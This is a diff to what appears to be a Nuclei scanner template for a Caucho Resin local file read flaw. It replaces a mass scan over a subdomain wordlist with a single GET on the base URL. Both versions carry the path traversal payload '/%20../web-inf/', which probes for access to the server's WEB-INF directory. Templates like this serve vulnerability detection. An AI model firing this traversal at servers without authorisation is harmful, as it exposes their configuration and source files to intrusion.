@@ -8,19 +8,9 @@ info:
   tags: resin,caucho,lfr
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
-      - |
-        GET /%20../web-inf/ HTTP/1.1
-        Host: {{Subdomains}}
-        Accept-Encoding: gzip, deflate
-        Accept: */*
-        Connection: close
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+  - method: GET
+    path:
+      - "{{BaseURL}}/%20../web-inf/"
     matchers-condition: and
     matchers:
       - type: status
